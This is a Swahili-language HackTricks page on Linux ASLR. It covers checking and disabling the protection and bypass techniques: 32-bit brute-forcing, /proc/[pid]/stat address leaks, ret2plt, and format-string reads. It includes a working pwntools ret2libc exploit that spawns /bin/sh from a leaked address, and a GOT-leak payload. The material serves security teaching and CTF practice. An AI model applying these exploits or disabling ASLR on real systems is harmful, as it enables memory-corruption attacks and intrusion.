# ASLR

{{#include ../../../../banners/hacktricks-training.md}}

## Taarifa za Msingi

**Address Space Layout Randomization (ASLR)** ni mbinu ya usalama inayotumika katika mifumo ya uendeshaji ili **kubadilisha anwani za kumbukumbu** zinazotumiwa na michakato ya mfumo na programu. Kwa kufanya hivyo, inafanya kuwa vigumu sana kwa mshambuliaji kutabiri eneo la michakato na data maalum, kama vile stack, heap, na maktaba, hivyo kupunguza aina fulani za mashambulizi, hasa buffer overflows.

### **Kuangalia Hali ya ASLR**

Ili **kuangalia** hali ya ASLR kwenye mfumo wa Linux, unaweza kusoma thamani kutoka kwenye faili ya `/proc/sys/kernel/randomize_va_space`. Thamani iliyohifadhiwa katika faili hii inaamua aina ya ASLR inayotumika:

- **0**: Hakuna kubadilisha. Kila kitu ni cha kudumu.
- **1**: Kubadilisha kwa njia ya kihafidhina. Maktaba zinazoshirikiwa, stack, mmap(), ukurasa wa VDSO zinabadilishwa.
- **2**: Kubadilisha kwa njia kamili. Mbali na vipengele vinavyobadilishwa kwa njia ya kihafidhina, kumbukumbu inayosimamiwa kupitia `brk()` inabadilishwa.

Unaweza kuangalia hali ya ASLR kwa amri ifuatayo:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Kuzima ASLR**

Ili **kuzima** ASLR, unapaswa kuweka thamani ya `/proc/sys/kernel/randomize_va_space` kuwa **0**. Kuzima ASLR kwa ujumla hakupendekezwi nje ya hali za majaribio au urekebishaji. Hapa kuna jinsi unavyoweza kuzikatiza:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Unaweza pia kuzima ASLR kwa ajili ya utekelezaji kwa:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Kuwezesha ASLR**

Ili **kuezesha** ASLR, unaweza kuandika thamani ya **2** kwenye faili ya `/proc/sys/kernel/randomize_va_space`. Hii kwa kawaida inahitaji ruhusa za mzizi. Kuwezesha randomization kamili kunaweza kufanywa kwa amri ifuatayo:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Uendelevu Wakati wa Upya**

Mabadiliko yaliyofanywa na amri za `echo` ni ya muda na yatarejelewa wakati wa upya. Ili kufanya mabadiliko kuwa ya kudumu, unahitaji kuhariri faili ya `/etc/sysctl.conf` na kuongeza au kubadilisha mstari ufuatao:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Baada ya kuhariri `/etc/sysctl.conf`, tumia mabadiliko kwa:
```bash
sudo sysctl -p
```
Hii itahakikisha kwamba mipangilio yako ya ASLR inabaki wakati wa kuanzisha upya.

## **Mikakati ya Kuepuka**

### 32bit brute-forcing

PaX inagawanya nafasi ya anwani ya mchakato katika **makundi 3**:

- **Msimbo na data** (iliyowekwa na isiyowekwa): `.text`, `.data`, na `.bss` —> **16 bits** za entropy katika mabadiliko ya `delta_exec`. Mabadiliko haya yanaanzishwa kwa bahati nasibu na kila mchakato na kuongezwa kwa anwani za awali.
- **Kumbukumbu** iliyotolewa na `mmap()` na **maktaba zinazoshirikiwa** —> **16 bits**, inayoitwa `delta_mmap`.
- **Stack** —> **24 bits**, inayoitwa `delta_stack`. Hata hivyo, inatumia kwa ufanisi **11 bits** (kutoka byte ya 10 hadi ya 20 ikiwa ni pamoja), iliyopangwa kwa **16 bytes** —> Hii inasababisha **524,288 anwani halisi za stack zinazowezekana**.

Data ya awali ni kwa mifumo ya 32-bit na entropy ya mwisho iliyopunguzwa inafanya iwezekane kuepuka ASLR kwa kujaribu kutekeleza mara kwa mara hadi exploit ikamilike kwa mafanikio.

#### Mawazo ya Brute-force:

- Ikiwa una overflow kubwa ya kutosha kuhost **sled kubwa ya NOP kabla ya shellcode**, unaweza tu kujaribu anwani katika stack hadi mtiririko **ujumpie sehemu fulani ya sled ya NOP**.
- Chaguo lingine kwa hili ikiwa overflow si kubwa sana na exploit inaweza kuendeshwa kwa ndani ni kuweza **kuongeza sled ya NOP na shellcode katika variable ya mazingira**.
- Ikiwa exploit ni ya ndani, unaweza kujaribu brute-force anwani ya msingi ya libc (inayofaa kwa mifumo ya 32bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Ikiwa unashambulia seva ya mbali, unaweza kujaribu **kujaribu nguvu anwani ya kazi ya `libc` `usleep`**, ukipitia kama hoja 10 (kwa mfano). Ikiwa katika wakati fulani **seva inachukua sekunde 10 zaidi kujibu**, umepata anwani ya kazi hii.

> [!TIP]
> Katika mifumo ya 64bit, entropy ni kubwa zaidi na hii haiwezekani.

### Taarifa za Mlokole (`/proc/[pid]/stat`)

Faili **`/proc/[pid]/stat`** ya mchakato daima inasomeka na kila mtu na ina **maelezo ya kuvutia** kama vile:

- **startcode** & **endcode**: Anwani juu na chini na **TEXT** ya binary
- **startstack**: Anwani ya mwanzo wa **stack**
- **start_data** & **end_data**: Anwani juu na chini ambapo **BSS** iko
- **kstkesp** & **kstkeip**: Anwani za sasa za **ESP** na **EIP**
- **arg_start** & **arg_end**: Anwani juu na chini ambapo **cli arguments** ziko.
- **env_start** & **env_end**: Anwani juu na chini ambapo **env variables** ziko.

Kwa hivyo, ikiwa mshambuliaji yuko kwenye kompyuta moja na binary inayoshambuliwa na binary hii haitarajii overflow kutoka kwa hoja za moja kwa moja, bali kutoka kwa **input tofauti ambayo inaweza kuundwa baada ya kusoma faili hii**. Inawezekana kwa mshambuliaji **kupata anwani kadhaa kutoka kwa faili hii na kujenga offsets kutoka kwao kwa ajili ya exploit**.

> [!TIP]
> Kwa maelezo zaidi kuhusu faili hii angalia [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) ukitafuta `/proc/pid/stat`

### Kuwa na leak

- **Changamoto ni kutoa leak**

Ikiwa umepatiwa leak (changamoto rahisi za CTF), unaweza kuhesabu offsets kutoka kwake (ukidhani kwa mfano unajua toleo halisi la libc linalotumika katika mfumo unaoshambuliwa). Mfano huu wa exploit umetolewa kutoka [**mfano kutoka hapa**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (angalia ukurasa huo kwa maelezo zaidi):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
- **ret2plt**

Kwa kutumia overflow ya buffer, itakuwa inawezekana kutumia **ret2plt** kuhamasisha anwani ya kazi kutoka kwa libc. Angalia:

{{#ref}}
ret2plt.md
{{#endref}}

- **Format Strings Arbitrary Read**

Kama ilivyo katika ret2plt, ikiwa una kusoma kwa njia isiyo ya kawaida kupitia udhaifu wa format strings, inawezekana kuhamasisha anwani ya **libc function** kutoka kwa GOT. Mfano ufuatao [**ni kutoka hapa**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Unaweza kupata maelezo zaidi kuhusu Format Strings kusoma bila mpangilio katika:

{{#ref}}
../../format-strings/
{{#endref}}

### Ret2ret & Ret2pop

Jaribu kupita ASLR kwa kutumia anwani ndani ya stack:

{{#ref}}
../../stack-overflow/ret2ret.md
{{#endref}}

{{#include ../../../../banners/hacktricks-training.md}}
